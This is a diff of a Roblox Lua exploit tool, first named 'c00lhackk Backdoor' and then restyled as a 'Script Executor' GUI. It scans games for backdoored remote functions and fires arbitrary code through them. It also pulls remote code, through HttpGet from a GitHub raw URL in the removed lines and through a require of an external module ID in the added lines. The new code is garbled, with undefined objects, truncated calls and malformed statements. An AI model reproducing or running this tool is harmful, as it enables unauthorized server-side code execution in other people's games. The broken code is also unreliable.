@@ -1,108 +1,119 @@
--- Import from URL feature coming soon!
+-- Services
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
-print("c00lhackkBackdoor // Successfully booted up!!")
-local function debug(msg)
-	if 0 == 1 then 
-	game:GetService('TestService'):Message('c00lhackkBackdoor // '..tostring(msg)) -- This is for debugging. 
-	end 
-end 
+-- Main UI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CustomExecutorUI"
+ScreenGui.Parent = PlayerGui
 
--- Create GUI Objects
+-- Icon for UI
+local Icon = Instance.new("ImageLabel")
+Icon.Name = "Icon"
+Icon.Size = UDim2.new(0, 50, 0, 50)
+Icon.Position = UDim2.new(0, 15, 0, 15)
+Icon.BackgroundTransparency = 1
+Icon.Image = "rbxassetid://12345678" -- Replace with your image asset ID
+Icon.Parent = ScreenGui
 
-local ScrnGui = Instance.new("ScreenGui")
-local MnPrt = Instance.new("Frame")
-local InPrt = Instance.new("Frame")
-local Cody = Instance.new("TextBox")
-local Execy = Instance.new("TextButton")
-local Acqur = Instance.new("TextButton")
-local Labely = Instance.new("TextLabel")
+-- UDim2.new(0.25, 0, 0.2, 0) -- Centered
+MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
 
+-- Title Bar
+local TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TitleBar.Text = "Script Executor"
+TitleBar.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleBar.TextScaled = true
+TitleBar.Font = Enum.Font.SourceSansBold
+TitleBar.Parent = Main height
+ScriptSection.Position = UDim2.new(0.025, 0, 0.15, 0) -- Slightly inset
+ScriptSection.CanvasSize = UDim2.new(0, 0, 5, 0)
+ScriptSection.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+ScriptSection.BorderSizePixel = 0
+ScriptSection.Parent = MainFrame
 
+-- TextBox for Script Input
+local ScriptBox = Instance.new("TextBox")
+ScriptBox.Name = "ScriptBox"
+ScriptBox.Size = UDim2.new(0.95, 0, 0.15, 0) -- 95% width, 15% height
+ScriptBox.Position = UDim2.new(0.025, 0, 0.8, 0)
+ScriptBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+ScriptBox.Text = "-- Enter your script here"
+ScriptBox.TextSize = 14
+ScriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScriptBox.Font = Enum.Font.SourceSans
+ScriptBox.MultiLine = true
+ScriptBox.Parent = MainFrame
 
--- Set Properties
+-- Execute Button
+local ExecuteButton = Instance.new("TextButton")
+ExecuteButton.Name = "ExecuteButton"
+ExecuteButton.Size = UDim2.new(0.3, 0, 0.1, 0) -- 30% width, 10% height
+ExecuteButton.Position = UDim2.new(0.05, 0, ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 128, 0) -- Green
+ExecuteButton.Text = "Execute"
+ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteButton.TextScaled = true
+ExecuteButton.Font = Enum.Font.SourceSansBold
+ExecuteButton.Parent = MainFrame
 
-ScrnGui.Name = "c00lhackkBackdoor"
-ScrnGui.Parent = game:GetService('CoreGui')
-ScrnGui.ResetOnSpawn = false
+-- Clear Button
+local ClearButton = Instance.new("TextButton")
+ClearButton.Name = "ClearButton"
+ClearButton.Size = UDim2.new(0.3, 0, 0.1, 0) -- 30% width, 10% height
+ClearButton.Position = UDim2.new(0.35, 0, 0.95, 0) -- Bottom-center
+ClearButton.BackgroundColor3 = Color3.fromRGB(128, 0, 0) -- Red
+ClearButton.Text = "Clear"
+ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ClearButton.TextScaled = true
+ClearButton.Font = Enum.Font.SourceSansBold
+ClearButton.Parent = MainFrame
 
-MnPrt.ZIndex = -1;
-MnPrt.BorderSizePixel = 0;
-MnPrt.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
-MnPrt.Size = UDim2.new(0, 611, 0, 352);
-MnPrt.ClipsDescendants = true;
-MnPrt.Position = UDim2.new(0.20000000298023224, 0, 0.10000000149011612, 0);
-MnPrt.Name = MainPart
-MnPrt.Draggable = true
+-- Scan Button
+local ScanButton = Instance.new("TextButton")
+ScanButton.Name = "ScanButton"
+ScanButton.Size = UDim2.new(0.3, 0, 0.1, 0) -- 30% width, 10% height
+ScanButton.Position = UDim2.new(0.65, 0, 0.95, 0) -- Bottom-right
+ScanButton.BackgroundColor3 = Color3.fromRGB(0, 0, 128) -- Blue
+ScanButton.Text = "Scan"
+ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScanButton.TextScaled = true
+ScanButton.Font = Enum.Font.SourceSansBold
+ScanButton.Parent = MainFrame
 
-InPrt.ZIndex = 3;
-InPrt.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
-InPrt.AnchorPoint = Vector2.new(1, 0.5);
-InPrt.BackgroundTransparency = 1;
-InPrt.Size = UDim2.new(1, 0, 0, 31);
-InPrt.Position = UDim2.new(1, -10, 0.5, 0);
-InPrt.Name = RightOutline
+-- Script Button Template
+local ScriptButtonTemplate = Instance.new("TextButton")
+ScriptButtonTemplate.Name = "ScriptButtonTemplate"
+ScriptButtonTemplate.Size = UDim2.new(0.9, 0, 0, 30) -- Buttons for scripts
+ScriptButtonTemplate.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+ScriptButtonTemplate.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScriptButtonTemplate.TextScaled = true
+ScriptButtonTemplate.Font = Enum.Font.SourceSans
 
-Cody.Active = true
-Cody.BackgroundColor3 = Color3.new(0,0,0)
-Cody.BorderColor3 = Color3.new(1,0,0)
-Cody.ClearTextOnFocus = false
-Cody.MultiLine = true
-Cody.Name = "Code"
-Cody.Parent = InPrt
-Cody.Position = UDim2.new(0,5,0,5)
-Cody.Size = UDim2.new(0,350,0,140)
-Cody.Font = Enum.Font.Legacy
-Cody.FontSize = Enum.FontSize.Size8
-Cody.Text = game:HttpGet('https://raw.githubusercontent.com/Shadowhacksaw/Hi/refs/heads/main/c00lhackkbackdoor.checker')
-Cody.TextColor3 = Color3.new(1,0,0)
-Cody.TextWrapped = true
-Cody.TextXAlignment = Enum.TextXAlignment.Left
-Cody.TextYAlignment = Enum.TextYAlignment.Top
+-- Add Scripts Dynamically
+local scripts = {
+    { Name = "Hello World", Code = "print('Hello, World!')" },
+    { Name = "Loop Example", Code = "for i = 1, 10 do print(i) end" },
+    { Name = "Wait Example", Code = "wait(5)\nprint('Waited 5 seconds')" },
+}
 
-Execy.Active = true
-Execy.BackgroundColor3 = Color3.new(0,0,0)
-Execy.BorderColor3 = Color3.new(1,0,0)
-Execy.Name = "Execute"
-Execy.Parent = InPrt
-Execy.Position = UDim2.new(0,5,0,150)
-Execy.Size = UDim2.new(0,170,0,35)
-Execy.Font = Enum.Font.Legacy
-Execy.FontSize = Enum.FontSize.Size14
-Execy.Text = 'Execute!!'
-Execy.TextColor3 = Color3.new(1,0,0)
+for _, script in ipairs(scripts) do
+    local ScriptButton = ScriptButtonTemplate:Clone()
+    ScriptButton.Text = server side executor require script
+    ScriptButton.Parent = ScriptSection
 
-Acqur.Active = true
-Acqur.BackgroundColor3 = Color3.new(0,0,0)
-Acqur.BorderColor3 = Color3.new(1,0,0)
-Acqur.Name = "Scan"
-Acqur.Parent = InPrt
-Acqur.Position = UDim2.new(0,185,0,150)
-Acqur.Size = UDim2.new(0,170,0,35)
-Acqur.Font = Enum.Font.Legacy
-Acqur.FontSize = Enum.FontSize.Size14
-Acqur.Text = 'Scan!!'
-Acqur.TextColor3 = Color3.new(1,0,0)
+    -- Add functionality to place script into ScriptBox
+    ScriptButton.MouseButton1Click:Connect(function()
+        ScriptBox.Text = require(10868847330):pls("YourUsername")
+    end)
+end
 
-Labely.Active = true
-Labely.BackgroundColor3 = Color3.new(0,0,0)
-Labely.BorderColor3 = Color3.new(1,0,0)
-Labely.Name = "Title"
-Labely.Parent = MnPrt
-Labely.Position = UDim2.new(0,180,0,25)
-Labely.Size = UDim2.new(0,0,0,0)
-Labely.Font = Enum.Font.Legacy
-Labely.FontSize = Enum.FontSize.Size14
-Labely.Text = 'c00lhackk Backdoor v0.1'
-Labely.TextColor3 = Color3.new(1,0,0)
-
--- Add functionalities!
-
-local AcquiredRemote = nil 
-local IsAcquiring = false 
-
-Execy.MouseButton1Click:Connect(function()
+-- Button Functionalities
+ExecuteButton.MouseButton1Click:Connect(function()
 	-- Fetch code from TextBox.
-	local CodeStr = Cody.Text
+	local ScriptBox = ScriptBox.Text
 	local InvokeFunc = Instance.new("BindableEvent")
 	InvokeFunc.Event:Connect(function(rfunc,codestr2)
 		-- This invokes the RemoteFunction without waiting.
@@ -143,10 +154,15 @@ Execy.MouseButton1Click:Connect(function()
 	DeepFire(game)
 end)
 
--- While making this acquire feature, my brain almost exploded.
 
-Acqur.MouseButton1Click:Connect(function() 
-	local RemoteList = {} 
+ClearButton.MouseButton1Click:Connect(function()
+    ScriptBox.Text = ""
+    print("Script Box Cleared")
+end)
+
+ScanButton.MouseButton1Click:Connect(function()
+    print("Scanning...")
+ local RemoteList = {} 
 	local CurrentRemote = nil 
 	local isFound = false
 	if not isAcquiring then 
@@ -189,15 +205,15 @@ Acqur.MouseButton1Click:Connect(function()
 		end 	
 		if AcquiredRemote ~= nil then 
 			isFound = true 
-			Cody.Text = '-- backdoor found! :D' 
+			ScriptBox.Text = '-- backdoor found! :D' 
 			warn('c00lhackkBackdoor // backdoor found! :D')
 		else 
 			isFound = false 
-			Cody.Text = '-- backdoor Not found! :(. :(' 
+			ScriptBox.Text = '-- backdoor Not found! :(. :(' 
 			warn('c00lhackkBackdoor // backdoor Not found. :(')
 		end 
 		isAcquiring = false 
 	end 
 end)
 
--- That's the end of the code!
+end)
